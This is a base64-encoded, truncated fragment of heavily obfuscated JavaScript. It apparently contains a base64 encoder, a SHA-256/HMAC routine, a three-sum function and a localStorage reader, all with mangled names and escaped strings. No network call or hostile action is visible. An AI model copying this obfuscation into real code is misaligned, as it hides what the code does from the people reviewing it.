Y2goX19fX3Z0MCl7X19fX19oNng9IiJ9dmFyIF9fX196dHE9Ilx1MDA0MVx1MDA0Mlx1MDA0M1x1MDA0NFx1MDA0NVx1MDA0Nlx1MDA0N1x1MDA0OFx1MDA0OVx1MDA0YVx1MDA0Ylx1MDA0Y1x1MDA0ZCIrIlx1MDA0ZVx1MDA0Zlx1MDA1MFx1MDA1MVx1MDA1Mlx1MDA1M1x1MDA1NFx1MDA1NVx1MDA1Nlx1MDA1N1x1MDA1OFx1MDA1OVx1MDA1YSIrIlx4NjFceDYyXHg2M1x4NjRceDY1XHg2Nlx4NjdceDY4XHg2OVx4NmFceDZiXHg2Y1x4NmQiKyJcdTAwNmVcdTAwNmZcdTAwNzBcdTAwNzFcdTAwNzJcdTAwNzNcdTAwNzRcdTAwNzVcdTAwNzZcdTAwNzdcdTAwNzhcdTAwNzlcdTAwN2EiKyJcdTAwMzBcdTAwMzFcdTAwMzJcdTAwMzNcdTAwMzRcdTAwMzVcdTAwMzZcdTAwMzdcdTAwMzhcdTAwMzlcdTAwMmJcdTAwMmYiO3ZhciBfX19hOWc9IiI7dmFyIF9fX3kxOD1fX19fX190aTUubGVuZ3RoO2Zvcih2YXIgX19fX19uaTQ9X19fX19fM2gxWzJdO19fX19fbmk0PF9fX3kxODtfX19fX25pNCs9X19fX19fM2gxWzE1XSl7dmFyIF9fX19fdGkyPV9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fbmk0KTw8X19fX19fM2gxWzhdfChfX19fX25pNCtfX19fX18zaDFbMV08X19feTE4P19fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fbmk0K19fX19fXzNoMVsxXSk8PF9fX19fXzNoMVs3XTpfX19fX18zaDFbMl0pfChfX19fX25pNCtfX19fX18zaDFbMF08X19feTE4P19fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fbmk0K19fX19fXzNoMVswXSk6X19fX19fM2gxWzJdKTtmb3IodmFyIF9fX19hZWQ9X19fX19fM2gxWzJdO19fX19hZWQ8X19fX19fM2gxWzE2XTtfX19fYWVkKyspe2lmKF9fX19fbmk0Kl9fX19fXzNoMVs3XStfX19fYWVkKl9fX19fXzNoMVsxN10+X19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pX19fYTlnKz1fX19fX2g2eDtlbHNlIF9fX2E5Zys9X19fX3p0cS5jaGFyQXQoX19fX190aTI+Pj5fX19fX18zaDFbMTddKihfX19fX18zaDFbMTVdLV9fX19hZWQpJl9fX19fXzNoMVsxOV0pfX1yZXR1cm4gX19fYTlnfWZ1bmN0aW9uIF9fX19feTlmKF9fX19fX3RpNSxfX19fX2g2eCl7dmFyIF9fX192dDA9X19fX19oNngubGVuZ3RoO3ZhciBfX19fenRxPUFycmF5KCk7dmFyIF9fX2E5ZyxfX195MTgsX19fX19uaTQsX19fX190aTI7dmFyIF9fX19hZWQ9QXJyYXkoTWF0aC5jZWlsKF9fX19fX3RpNS5sZW5ndGgvX19fX19fM2gxWzBdKSk7Zm9yKF9fX2E5Zz1fX19fX18zaDFbMl07X19fYTlnPF9fX19hZWQubGVuZ3RoO19fX2E5ZysrKXtfX19fYWVkW19fX2E5Z109X19fX19fdGk1LmNoYXJDb2RlQXQoX19fYTlnKl9fX19fXzNoMVswXSk8PF9fX19fXzNoMVs3XXxfX19fX190aTUuY2hhckNvZGVBdChfX19hOWcqX19fX19fM2gxWzBdK19fX19fXzNoMVsxXSl9d2hpbGUoX19fX2FlZC5sZW5ndGg+X19fX19fM2gxWzJdKXtfX19fX3RpMj1BcnJheSgpO19fX19fbmk0PV9fX19fXzNoMVsyXTtmb3IoX19fYTlnPV9fX19fXzNoMVsyXTtfX19hOWc8X19fX2FlZC5sZW5ndGg7X19fYTlnKyspe19fX19fbmk0PShfX19fX25pNDw8X19fX19fM2gxWzhdKStfX19fYWVkW19fX2E5Z107X19feTE4PU1hdGguZmxvb3IoX19fX19uaTQvX19fX3Z0MCk7X19fX19uaTQtPV9fX3kxOCpfX19fdnQwO2lmKF9fX19fdGkyLmxlbmd0aD5fX19fX18zaDFbMl18fF9fX3kxOD5fX19fX18zaDFbMl0pX19fX190aTJbX19fX190aTIubGVuZ3RoXT1fX195MTh9X19fX3p0cVtfX19fenRxLmxlbmd0aF09X19fX19uaTQ7X19fX2FlZD1fX19fX3RpMn12YXIgX19fX19hODg9IiI7Zm9yKF9fX2E5Zz1fX19fenRxLmxlbmd0aC1fX19fX18zaDFbMV07X19fYTlnPj1fX19fX18zaDFbMl07X19fYTlnLS0pX19fX19hODgrPV9fX19faDZ4LmNoYXJBdChfX19fenRxW19fX2E5Z10pO3ZhciBfX19fX19seGU9TWF0aC5jZWlsKF9fX19fX3RpNS5sZW5ndGgqX19fX19fM2gxWzddLyhNYXRoLmxvZyhfX19fX2g2eC5sZW5ndGgpL01hdGgubG9nKF9fX19fXzNoMVswXSkpKTtmb3IoX19fYTlnPV9fX19fYTg4Lmxlbmd0aDtfX19hOWc8X19fX19fbHhlO19fX2E5ZysrKV9fX19fYTg4PV9fX19faDZ4W19fX19fXzNoMVsyXV0rX19fX19hODg7cmV0dXJuIF9fX19fYTg4fWZ1bmN0aW9uIF9fX180dGooX19fX19fdGk1KXt2YXIgX19fX19oNng9IiI7dmFyIF9fX192dDA9LV9fX19fXzNoMVsxXTt2YXIgX19fX3p0cSxfX19hOWc7d2hpbGUoKytfX19fdnQwPF9fX19fX3RpNS5sZW5ndGgpe19fX196dHE9X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX3Z0MCk7X19fYTlnPV9fX192dDArX19fX19fM2gxWzFdPF9fX19fX3RpNS5sZW5ndGg/X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX3Z0MCtfX19fX18zaDFbMV0pOl9fX19fXzNoMVsyXTtpZihfX19fX18zaDFbMzldPD1fX19fenRxJiZfX19fenRxPD1fX19fX18zaDFbNDBdJiZfX19fX18zaDFbNDFdPD1fX19hOWcmJl9fX2E5Zzw9X19fX19fM2gxWzQyXSl7X19fX3p0cT1fX19fX18zaDFbNDNdKygoX19fX3p0cSZfX19fX18zaDFbMThdKTw8X19fX19fM2gxWzRdKSsoX19fYTlnJl9fX19fXzNoMVsxOF0pO19fX192dDArK31pZihfX19fenRxPD1fX19fX18zaDFbNDRdKV9fX19faDZ4Kz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX196dHEpO2Vsc2UgaWYoX19fX3p0cTw9X19fX19fM2gxWzQ1XSlfX19fX2g2eCs9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fX18zaDFbNDZdfF9fX196dHE+Pj5fX19fX18zaDFbMTddJl9fX19fXzNoMVs0N10sX19fX19fM2gxWzIwXXxfX19fenRxJl9fX19fXzNoMVsxOV0pO2Vsc2UgaWYoX19fX3p0cTw9X19fX19fM2gxWzMwXSlfX19fX2g2eCs9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fX18zaDFbNDhdfF9fX196dHE+Pj5fX19fX18zaDFbMjFdJl9fX19fXzNoMVsxNF0sX19fX19fM2gxWzIwXXxfX19fenRxPj4+X19fX19fM2gxWzE3XSZfX19fX18zaDFbMTldLF9fX19fXzNoMVsyMF18X19fX3p0cSZfX19fX18zaDFbMTldKTtlbHNlIGlmKF9fX196dHE8PV9fX19fXzNoMVs0OV0pX19fX19oNngrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fM2gxWzUwXXxfX19fenRxPj4+X19fX19fM2gxWzI3XSZfX19fX18zaDFbMjZdLF9fX19fXzNoMVsyMF18X19fX3p0cT4+Pl9fX19fXzNoMVsyMV0mX19fX19fM2gxWzE5XSxfX19fX18zaDFbMjBdfF9fX196dHE+Pj5fX19fX18zaDFbMTddJl9fX19fXzNoMVsxOV0sX19fX19fM2gxWzIwXXxfX19fenRxJl9fX19fXzNoMVsxOV0pfXJldHVybiBfX19fX2g2eH1mdW5jdGlvbiBfX19fa3YwKF9fX19fX3RpNSl7dmFyIF9fX19faDZ4PSIiO2Zvcih2YXIgX19fX3Z0MD1fX19fX18zaDFbMl07X19fX3Z0MDxfX19fX190aTUubGVuZ3RoO19fX192dDArKylfX19fX2g2eCs9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fX190aTUuY2hhckNvZGVBdChfX19fdnQwKSZfX19fX18zaDFbMjJdLF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX192dDApPj4+X19fX19fM2gxWzddJl9fX19fXzNoMVsyMl0pO3JldHVybiBfX19fX2g2eH1mdW5jdGlvbiBfX19fX18yMHQoX19fX19fdGk1KXt2YXIgX19fX19oNng9IiI7Zm9yKHZhciBfX19fdnQwPV9fX19fXzNoMVsyXTtfX19fdnQwPF9fX19fX3RpNS5sZW5ndGg7X19fX3Z0MCsrKV9fX19faDZ4Kz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX192dDApPj4+X19fX19fM2gxWzddJl9fX19fXzNoMVsyMl0sX19fX19fdGk1LmNoYXJDb2RlQXQoX19fX3Z0MCkmX19fX19fM2gxWzIyXSk7cmV0dXJuIF9fX19faDZ4fWZ1bmN0aW9uIF9fX19oeW8oX19fX19fdGk1KXt2YXIgX19fX19oNng9QXJyYXkoX19fX19fdGk1Lmxlbmd0aD4+X19fX19fM2gxWzBdKTtmb3IodmFyIF9fX192dDA9X19fX19fM2gxWzJdO19fX192dDA8X19fX19oNngubGVuZ3RoO19fX192dDArKylfX19fX2g2eFtfX19fdnQwXT1fX19fX18zaDFbMl07Zm9yKHZhciBfX19fdnQwPV9fX19fXzNoMVsyXTtfX19fdnQwPF9fX19fX3RpNS5sZW5ndGgqX19fX19fM2gxWzddO19fX192dDArPV9fX19fXzNoMVs3XSlfX19fX2g2eFtfX19fdnQwPj5fX19fX18zaDFbMjRdXXw9KF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX192dDAvX19fX19fM2gxWzddKSZfX19fX18zaDFbMjJdKTw8X19fX19fM2gxWzI1XS1fX19fdnQwJV9fX19fXzNoMVsyM107cmV0dXJuIF9fX19faDZ4fWZ1bmN0aW9uIF9fX3YzZihfX19fX190aTUpe3ZhciBfX19fX2g2eD0iIjtmb3IodmFyIF9fX192dDA9X19fX19fM2gxWzJdO19fX192dDA8X19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbMjNdO19fX192dDArPV9fX19fXzNoMVs3XSlfX19fX2g2eCs9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fX190aTVbX19fX3Z0MD4+X19fX19fM2gxWzI0XV0+Pj5fX19fX18zaDFbMjVdLV9fX192dDAlX19fX19fM2gxWzIzXSZfX19fX18zaDFbMjJdKTtyZXR1cm4gX19fX19oNnh9ZnVuY3Rpb24gX19fX19fNnBlKF9fX19fX3RpNSxfX19fX2g2eCl7cmV0dXJuIF9fX19fX3RpNT4+Pl9fX19faDZ4fF9fX19fX3RpNTw8X19fX19fM2gxWzIzXS1fX19fX2g2eH1mdW5jdGlvbiBfX19faTBsKF9fX19fX3RpNSxfX19fX2g2eCl7cmV0dXJuIF9fX19fX3RpNT4+Pl9fX19faDZ4fWZ1bmN0aW9uIF9fX19qZHMoX19fX19fdGk1LF9fX19faDZ4LF9fX192dDApe3JldHVybiBfX19fX190aTUmX19fX19oNnhefl9fX19fX3RpNSZfX19fdnQwfWZ1bmN0aW9uIF9fX19fdWNkKF9fX19fX3RpNSxfX19fX2g2eCxfX19fdnQwKXtyZXR1cm4gX19fX19fdGk1Jl9fX19faDZ4Xl9fX19fX3RpNSZfX19fdnQwXl9fX19faDZ4Jl9fX192dDB9ZnVuY3Rpb24gX19fX19faXM4KF9fX19fX3RpNSl7cmV0dXJuIF9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzBdKV5fX19fX182cGUoX19fX19fdGk1LF9fX19fXzNoMVs1MV0pXl9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzUyXSl9ZnVuY3Rpb24gX19fX19fNTYzKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzE3XSleX19fX19fNnBlKF9fX19fX3RpNSxfX19fX18zaDFbNTNdKV5fX19fX182cGUoX19fX19fdGk1LF9fX19fXzNoMVs1NF0pfWZ1bmN0aW9uIF9fX19fZmFsKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzI2XSleX19fX19fNnBlKF9fX19fX3RpNSxfX19fX18zaDFbMjddKV5fX19faTBsKF9fX19fX3RpNSxfX19fX18zaDFbMTVdKX1mdW5jdGlvbiBfX19fX185b2QoX19fX19fdGk1KXtyZXR1cm4gX19fX19fNnBlKF9fX19fX3RpNSxfX19fX18zaDFbNTVdKV5fX19fX182cGUoX19fX19fdGk1LF9fX19fXzNoMVsyOF0pXl9fX19pMGwoX19fX19fdGk1LF9fX19fXzNoMVs0XSl9ZnVuY3Rpb24gX19fX19faGprKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzU2XSleX19fX19fNnBlKF9fX19fX3RpNSxfX19fX18zaDFbNTddKV5fX19fX182cGUoX19fX19fdGk1LF9fX19fXzNoMVs1OF0pfWZ1bmN0aW9uIF9fX19fXzB0OShfX19fX190aTUpe3JldHVybiBfX19fX182cGUoX19fX19fdGk1LF9fX19fXzNoMVs1OV0pXl9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzI3XSleX19fX19fNnBlKF9fX19fX3RpNSxfX19fX18zaDFbNjBdKX1mdW5jdGlvbiBfX19fMHpoKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzFdKV5fX19fX182cGUoX19fX19fdGk1LF9fX19fXzNoMVs3XSleX19fX2kwbChfX19fX190aTUsX19fX19fM2gxWzI2XSl9ZnVuY3Rpb24gX19fX2Y2bihfX19fX190aTUpe3JldHVybiBfX19fX182cGUoX19fX19fdGk1LF9fX19fXzNoMVsyOF0pXl9fX19fXzZwZShfX19fX190aTUsX19fX19fM2gxWzYxXSleX19fX2kwbChfX19fX190aTUsX19fX19fM2gxWzE3XSl9dmFyIF9fX19zY2Q9bmV3IEFycmF5KF9fX19fXzNoMVs2Ml0sX19fX19fM2gxWzYzXSwtX19fX19fM2gxWzY0XSwtX19fX19fM2gxWzY1XSxfX19fX18zaDFbNjZdLF9fX19fXzNoMVs2N10sLV9fX19fXzNoMVs2OF0sLV9fX19fXzNoMVs2OV0sLV9fX19fXzNoMVs3MF0sX19fX19fM2gxWzcxXSxfX19fX18zaDFbNzJdLF9fX19fXzNoMVs3M10sX19fX19fM2gxWzc0XSwtX19fX19fM2gxWzc1XSwtX19fX19fM2gxWzc2XSwtX19fX19fM2gxWzc3XSwtX19fX19fM2gxWzc4XSwtX19fX19fM2gxWzc5XSxfX19fX18zaDFbODBdLF9fX19fXzNoMVs4MV0sX19fX19fM2gxWzgyXSxfX19fX18zaDFbODNdLF9fX19fXzNoMVs4NF0sX19fX19fM2gxWzg1XSwtX19fX19fM2gxWzg2XSwtX19fX19fM2gxWzg3XSwtX19fX19fM2gxWzg4XSwtX19fX19fM2gxWzg5XSwtX19fX19fM2gxWzkwXSwtX19fX19fM2gxWzkxXSxfX19fX18zaDFbOTJdLF9fX19fXzNoMVs5M10sX19fX19fM2gxWzk0XSxfX19fX18zaDFbOTVdLF9fX19fXzNoMVs5Nl0sX19fX19fM2gxWzk3XSxfX19fX18zaDFbOThdLF9fX19fXzNoMVs5OV0sLV9fX19fXzNoMVsxMDBdLC1fX19fX18zaDFbMTAxXSwtX19fX19fM2gxWzEwMl0sLV9fX19fXzNoMVsxMDNdLC1fX19fX18zaDFbMTA0XSwtX19fX19fM2gxWzEwNV0sLV9fX19fXzNoMVsxMDZdLC1fX19fX18zaDFbMTA3XSwtX19fX19fM2gxWzEwOF0sX19fX19fM2gxWzEwOV0sX19fX19fM2gxWzExMF0sX19fX19fM2gxWzExMV0sX19fX19fM2gxWzExMl0sX19fX19fM2gxWzExM10sX19fX19fM2gxWzExNF0sX19fX19fM2gxWzExNV0sX19fX19fM2gxWzExNl0sX19fX19fM2gxWzExN10sX19fX19fM2gxWzExOF0sX19fX19fM2gxWzExOV0sLV9fX19fXzNoMVsxMjBdLC1fX19fX18zaDFbMTIxXSwtX19fX19fM2gxWzEyMl0sLV9fX19fXzNoMVsxMjNdLC1fX19fX18zaDFbMTI0XSwtX19fX19fM2gxWzEyNV0pO2Z1bmN0aW9uIF9fX2NjYShfX19fX190aTUsX19fX19oNngpe3ZhciBfX19fdnQwPW5ldyBBcnJheShfX19fX18zaDFbMTI2XSwtX19fX19fM2gxWzEyN10sX19fX19fM2gxWzEyOF0sLV9fX19fXzNoMVsxMjldLF9fX19fXzNoMVsxMzBdLC1fX19fX18zaDFbMTMxXSxfX19fX18zaDFbMTMyXSxfX19fX18zaDFbMTMzXSk7dmFyIF9fX196dHE9bmV3IEFycmF5KF9fX19fXzNoMVsyOV0pO3ZhciBfX19hOWcsX19feTE4LF9fX19fbmk0LF9fX19fdGkyLF9fX19hZWQsX19fX19hODgsX19fX19fbHhlLF9fX29xOTt2YXIgX19fX19fMzVxLF9fX19feTlmLF9fX180dGosX19fX2t2MDtfX19fX190aTVbX19fX19oNng+Pl9fX19fXzNoMVsyNF1dfD1fX19fX18zaDFbMjBdPDxfX19fX18zaDFbMjVdLV9fX19faDZ4JV9fX19fXzNoMVsyM107X19fX19fdGk1WyhfX19fX2g2eCtfX19fX18zaDFbMjldPj5fX19fX18zaDFbMTM0XTw8X19fX19fM2gxWzE2XSkrX19fX19fM2gxWzE0XV09X19fX19oNng7Zm9yKF9fX19fXzM1cT1fX19fX18zaDFbMl07X19fX19fMzVxPF9fX19fX3RpNS5sZW5ndGg7X19fX19fMzVxKz1fX19fX18zaDFbOF0pe19fX2E5Zz1fX19fdnQwW19fX19fXzNoMVsyXV07X19feTE4PV9fX192dDBbX19fX19fM2gxWzFdXTtfX19fX25pND1fX19fdnQwW19fX19fXzNoMVswXV07X19fX190aTI9X19fX3Z0MFtfX19fX18zaDFbMTVdXTtfX19fYWVkPV9fX192dDBbX19fX19fM2gxWzE2XV07X19fX19hODg9X19fX3Z0MFtfX19fX18zaDFbMjRdXTtfX19fX19seGU9X19fX3Z0MFtfX19fX18zaDFbMTddXTtfX19vcTk9X19fX3Z0MFtfX19fX18zaDFbMjZdXTtmb3IoX19fX195OWY9X19fX19fM2gxWzJdO19fX19feTlmPF9fX19fXzNoMVsyOV07X19fX195OWYrKyl7aWYoX19fX195OWY8X19fX19fM2gxWzhdKV9fX196dHFbX19fX195OWZdPV9fX19fX3RpNVtfX19fX3k5ZitfX19fX18zNXFdO2Vsc2UgX19fX3p0cVtfX19fX3k5Zl09X19fX19fOTIwKF9fX19fXzkyMChfX19fX185MjAoX19fX19fOW9kKF9fX196dHFbX19fX195OWYtX19fX19fM2gxWzBdXSksX19fX3p0cVtfX19fX3k5Zi1fX19fX18zaDFbMjZdXSksX19fX19mYWwoX19fX3p0cVtfX19fX3k5Zi1fX19fX18zaDFbMTRdXSkpLF9fX196dHFbX19fX195OWYtX19fX19fM2gxWzhdXSk7X19fXzR0aj1fX19fX185MjAoX19fX19fOTIwKF9fX19fXzkyMChfX19fX185MjAoX19fb3E5LF9fX19fXzU2MyhfX19fYWVkKSksX19fX2pkcyhfX19fYWVkLF9fX19fYTg4LF9fX19fX2x4ZSkpLF9fX19zY2RbX19fX195OWZdKSxfX19fenRxW19fX19feTlmXSk7X19fX2t2MD1fX19fX185MjAoX19fX19faXM4KF9fX2E5ZyksX19fX191Y2QoX19fYTlnLF9fX3kxOCxfX19fX25pNCkpO19fX29xOT1fX19fX19seGU7X19fX19fbHhlPV9fX19fYTg4O19fX19fYTg4PV9fX19hZWQ7X19fX2FlZD1fX19fX185MjAoX19fX190aTIsX19fXzR0aik7X19fX190aTI9X19fX19uaTQ7X19fX19uaTQ9X19feTE4O19fX3kxOD1fX19hOWc7X19fYTlnPV9fX19fXzkyMChfX19fNHRqLF9fX19rdjApfV9fX192dDBbX19fX19fM2gxWzJdXT1fX19fX185MjAoX19fYTlnLF9fX192dDBbX19fX19fM2gxWzJdXSk7X19fX3Z0MFtfX19fX18zaDFbMV1dPV9fX19fXzkyMChfX195MTgsX19fX3Z0MFtfX19fX18zaDFbMV1dKTtfX19fdnQwW19fX19fXzNoMVswXV09X19fX19fOTIwKF9fX19fbmk0LF9fX192dDBbX19fX19fM2gxWzBdXSk7X19fX3Z0MFtfX19fX18zaDFbMTVdXT1fX19fX185MjAoX19fX190aTIsX19fX3Z0MFtfX19fX18zaDFbMTVdXSk7X19fX3Z0MFtfX19fX18zaDFbMTZdXT1fX19fX185MjAoX19fX2FlZCxfX19fdnQwW19fX19fXzNoMVsxNl1dKTtfX19fdnQwW19fX19fXzNoMVsyNF1dPV9fX19fXzkyMChfX19fX2E4OCxfX19fdnQwW19fX19fXzNoMVsyNF1dKTtfX19fdnQwW19fX19fXzNoMVsxN11dPV9fX19fXzkyMChfX19fX19seGUsX19fX3Z0MFtfX19fX18zaDFbMTddXSk7X19fX3Z0MFtfX19fX18zaDFbMjZdXT1fX19fX185MjAoX19fb3E5LF9fX192dDBbX19fX19fM2gxWzI2XV0pfXJldHVybiBfX19fdnQwfWZ1bmN0aW9uIF9fX19fXzkyMChfX19fX190aTUsX19fX19oNngpe3ZhciBfX19fdnQwPShfX19fX190aTUmX19fX19fM2gxWzMwXSkrKF9fX19faDZ4Jl9fX19fXzNoMVszMF0pO3ZhciBfX19fenRxPShfX19fX190aTU+Pl9fX19fXzNoMVs4XSkrKF9fX19faDZ4Pj5fX19fX18zaDFbOF0pKyhfX19fdnQwPj5fX19fX18zaDFbOF0pO3JldHVybiBfX19fenRxPDxfX19fX18zaDFbOF18X19fX3Z0MCZfX19fX18zaDFbMzBdfXJldHVybntoZXg6X19fX3Z0MCxiNjQ6X19fX19uaTQsYW55Ol9fX19fdGkyLGhleF9obWFjOl9fX3kxOCxiNjRfaG1hYzpfX19fX25pNCxhbnlfaG1hYzpfX19fX3RpMn19KCk7Y29uc29sZS5sb2coX19fX19fdGk1KX1jb25zdCBfX19fX2g2eD1mdW5jdGlvbigpe2lmKCJcdTAwNGJcdTAwMzRcdTAwNmVcdTAwNzZcdTAwNmZcdTAwNDciKyJceDVhIiBpbiBfX19fX19seGUpe19fX19fX3RpNSgpfWZ1bmN0aW9uIF9fX19fX3RpNSgpe3ZhciBfX19fX190aTU9ZnVuY3Rpb24oX19fX19fdGk1KXt2YXIgX19fX19oNng9X19fX19fdGk1Lmxlbmd0aDt2YXIgX19fX3Z0MD1bXTt2YXIgX19fX3p0cT1fX19fX18zaDFbMl07dmFyIF9fX2E5Zz1fX19fX18zaDFbMl07X19fX19fdGk1LnNvcnQoKF9fX19fX3RpNSxfX19fX2g2eCk9Pl9fX19fX3RpNS1fX19fX2g2eCk7Zm9yKHZhciBfX195MTg9X19fX19fM2gxWzJdO19fX3kxODxfX19fX2g2eDtfX195MTgrKyl7aWYoX19feTE4Pl9fX19fXzNoMVsyXSYmX19fX19fdGk1W19fX3kxOF09PT1fX19fX190aTVbX19feTE4LV9fX19fXzNoMVsxXV0pY29udGludWU7X19fX3p0cT1fX195MTgrX19fX19fM2gxWzFdO19fX2E5Zz1fX19fX2g2eC1fX19fX18zaDFbMV07d2hpbGUoX19fX3p0cTxfX19hOWcpe2lmKF9fX19fX3RpNVtfX195MThdK19fX19fX3RpNVtfX19fenRxXStfX19fX190aTVbX19fYTlnXTxfX19fX18zaDFbMl0pe19fX196dHErK31lbHNlIGlmKF9fX19fX3RpNVtfX195MThdK19fX19fX3RpNVtfX19fenRxXStfX19fX190aTVbX19fYTlnXT5fX19fX18zaDFbMl0pe19fX2E5Zy0tfWVsc2V7X19fX3Z0MC5wdXNoKFtfX19fX190aTVbX19feTE4XSxfX19fX190aTVbX19fX3p0cV0sX19fX19fdGk1W19fX2E5Z11dKTt3aGlsZShfX19fenRxPF9fX2E5ZyYmX19fX19fdGk1W19fX196dHFdPT09X19fX19fdGk1W19fX196dHErX19fX19fM2gxWzFdXSlfX19fenRxKys7d2hpbGUoX19fX3p0cTxfX19hOWcmJl9fX19fX3RpNVtfX19hOWddPT09X19fX19fdGk1W19fX2E5Zy1fX19fX18zaDFbMV1dKV9fX2E5Zy0tO19fX196dHErKztfX19hOWctLX19fXJldHVybiBfX19fdnQwfTtjb25zb2xlLmxvZyhfX19fX190aTUpfWNvbnN0IF9fX19faDZ4PW5ldyBSZWdFeHAoX19fX19fM2gxWzE2MF0pO3JldHVybiBfX19fX2g2eFtfX19fX18zaDFbMTYxXV0oX19fYTlnKX07aWYoX19fX19oNngoKSl7aWYoIlx4NzdceDY0XHg0YVx4MzVceDYzXHg0OSIrIlx1MDA3MyIgaW4gX19fX19fbHhlKXtfX19fdnQwKCl9ZnVuY3Rpb24gX19fX3Z0MCgpe2Z1bmN0aW9uIF9fX19fX3RpNShfX19fX190aTUsX19fX19oNngpe2lmKHR5cGVvZiBfX19fX190aTUhPT1fX19fX18zaDFbMTYyXSl7dGhyb3cgbmV3IEVycm9yKCJcdTAwNDlcdTAwNmVcdTAwNzZcdTAwNjFcdTAwNmNcdTAwNjkiKyJcdTAwNjRcdTAwMjBcdTAwNjRcdTAwNjFcdTAwNzRcdTAwNjEiKyJceDIwXHg2Ylx4NjVceDc5XHgyMFx4NzAiKyJcdTAwNzJcdTAwNmZcdTAwNzZcdTAwNjlcdTAwNjRcdTAwNjUiKyJcdTAwNjRcdTAwMjBcdTAwMjhcdTAwNmVcdTAwNmZcdTAwNzQiKyJceDIwXHg3NFx4NzlceDcwXHg2NVx4MjAiK19fX19fXzNoMVsxNjJdK19fX19fXzNoMVsxNjNdKX1pZighX19fX19fdGk1KXt0aHJvdyBuZXcgRXJyb3IoIlx1MDA0OVx1MDA2ZVx1MDA3Nlx1MDA2MVx1MDA2Y1x1MDA2OVx1MDA2NCIrIlx4MjBceDY0XHg2MVx4NzRceDYxXHgyMFx4NmIiKyJcdTAwNjVcdTAwNzlcdTAwMjBcdTAwNzBcdTAwNzJcdTAwNmZcdTAwNzYiKyJcdTAwNjlcdTAwNjRcdTAwNjVcdTAwNjRcdTAwMjBcdTAwMjhcdTAwNjUiKyJceDZkXHg3MFx4NzRceDc5XHgyMFx4NzNceDc0IisiXHg3Mlx4NjlceDZlXHg2N1x4MjkiKX12YXIgX19fX3Z0MD13aW5kb3cubG9jYWxTdG9yYWdlLmdldEl0ZW0oX19fX19fdGk1KTt0cnl7X19fX3Z0MD1KU09OLnBhcnNlKF9fX192dDApfWNhdGNoKF9fX196dHEpe19fX19faDZ4KG5ldyBFcnJvcigiXHUwMDUzXHUwMDY1XHUwMDcyXHUwMDY5XHUwMDYxXHUwMDZjIisiXHUwMDY5XHUwMDdhXHUwMDYxXHUwMDc0XHUwMDY5XHUwMDZmIisiXHUwMDZlXHUwMDIwXHUwMDY1XHUwMDcyXHUwMDcyXHUwMDZmIisiXHUwMDcyXHUwMDIwXHUwMDY2XHUwMDZmXHUwMDcyXHUwMDIwIisiXHg2NFx4NjFceDc0XHg2MVx4MjBceDI3IitfX19fX190aTUrIlx4MjdceDNhXHgyMCIrX19fX3p0cS5tZXNzYWdlKSl9X19fX19oNngoX19fX19fM2gxWzNdLF9fX192dDApfX13aGlsZShfX19fX18zaDFbNl0pe2lmKCJceDU4XHg0N1x4NDNceDUxXHgzMlx4NDkiKyJcdTAwNDIiIGluIF9fX19fX2x4ZSl7X19fX3p0cSgpfWZ1bmN0aW9uIF9fX196dHEoKXt2YXIgX19fX19fdGk1PWZ1bmN0aW9uKF9fX19fX3RpNSxfX19fdnQwKXtyZXR1cm4gX19fX19oNngoe30sX19fX19fdGk1LF9fX192dDApfTt2YXIgX19fX19oNng9ZnVuY3Rpb24oX19fX19fdGk1LF9fX192dDAsX19fX3p0cSl7dmFyIF9fX2E5Zz17fTtpZihfX19fX190aTVbX19fX3Z0MCtfX19fenRxXSE9PV9fX19fXzNoMVsxNDNdKXJldHVybiBfX19fX190aTVbX19fX3Z0MCtfX19fenRxXTtpZihfX19fdnQwPT09X19fX3p0cSlyZXR1cm4gX19fX19fM2gxWzZdO2Zvcih2YXIgX19fX194cHU9X19fX19fM2gxWzJdO19fX19feHB1PF9fX192dDAubGVuZ3RoO19fX19feHB1Kyspe2lmKF9fX2E5Z1tfX19fdnQwW19fX19feHB1XV09PT1fX19fX18zaDFbMTQzXSlfX19hOWdbX19fX3Z0MFtfX19fX3hwdV1dPV9fX19fXzNoMVsyXTtpZihfX19hOWdbX19fX3p0cVtfX19fX3hwdV1dPT09X19fX19fM2gxWzE0M10pX19fYTlnW19fX196dHFbX19fX194cHVdXT1fX19fX18zaDFbMl07X19fYTlnW19fX192dDBbX19fX194cHVdXSsrO19fX2E5Z1tfX19fenRxW19fX19feHB1XV0tLX1mb3IodmFyIF9fX3kxOCBpbiBfX19hOWcpe2lmKF9fX2E5Z1tfX195MThdIT09X19fX19fM2gxWzJdKXtfX19fX190aTVbX19fX3Z0MCtfX19fenRxXT1fX19fX18zaDFbNV07cmV0dXJuIF9fX19fXzNoMVs1XX19Zm9yKHZhciBfX19fX25pND1fX19fX18zaDFbMV07X19fX19uaTQ8X19fX3Z0MC5sZW5ndGg7X19fX19uaTQrKyl7aWYoX19fX19oNngoX19fX19fdGk1LF9fX192dDAuc3Vic3RyKF9fX19fXzNoMVsyXSxfX19fX25pNCksX19fX3p0cS5zdWJzdHIoX19fX19fM2gxWzJdLF9fX19fbmk0KSkmJl9fX19faDZ4KF9fX19fX3RpNSxfX19fdnQwLnN1YnN0cihfX19fX25pNCk